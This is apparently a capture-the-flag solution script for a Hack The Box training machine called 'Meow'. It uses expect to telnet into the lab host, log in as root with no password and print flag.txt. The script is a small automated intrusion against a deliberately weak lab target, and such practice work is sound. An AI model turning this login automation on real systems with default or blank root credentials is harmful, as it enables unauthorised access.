#!/bin/bash

echo $(expect -c '
log_user 0

set timeout 30

set target "$::env(HTB_TARGET_IP)"
set user "root"

spawn telnet $target

expect -exact "Meow login: "
send -- "$user"
send -- "\n"

expect -exact "root@Meow:~#"
send -- "cat flag.txt"
send -- "\n"

log_user 1

expect -exact "root@Meow:~# "
send -- "exit"
send -- "\n"

log_user 0

expect -exact "Connection closed by foreign host."
expect -exact eof

exit
' | cut -d"#" -f2)

